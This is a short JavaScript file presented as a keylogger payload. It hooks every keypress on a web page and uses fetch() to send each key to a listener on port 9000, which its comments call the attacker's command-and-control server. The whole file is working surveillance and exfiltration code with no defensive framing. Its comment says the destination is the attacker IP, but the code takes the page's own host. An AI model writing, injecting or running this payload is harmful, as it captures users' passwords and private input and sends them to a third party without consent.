// keylogger_payload.js — auto-send keystrokes to attacker C2
(function () {
  const host = location.host.split(":")[0]; // attacker IP/domain
  const port = 9000;                         // listener port
  document.onkeypress = function (e) {
    fetch(`http://${host}:${port}/log?key=` + encodeURIComponent(e.key));
  };
})();
